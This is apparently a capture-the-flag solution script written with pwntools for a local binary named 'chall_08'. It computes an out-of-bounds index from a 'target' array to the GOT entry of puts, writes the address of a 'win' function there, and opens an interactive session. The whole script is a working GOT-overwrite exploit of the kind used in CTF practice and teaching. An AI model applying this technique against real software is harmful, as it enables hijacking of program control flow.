import pwn

pwn.context.arch = 'amd64'
elf = pwn.context.binary = pwn.ELF("./chall_08")

# *(int64_t *)(target + (int64_t)var_1ch * 8) = var_18h;
payload_a = (elf.got.puts - elf.sym.target) // 8
payload_a = str(payload_a).encode('ascii')
payload_b = elf.sym.win
payload_b = str(payload_b).encode('ascii')

p = pwn.process(elf.path)

print(f"payload_a: {payload_a}, payload_b: {payload_b}")
p.sendline(payload_b)

p.sendline(payload_a)

p.interactive()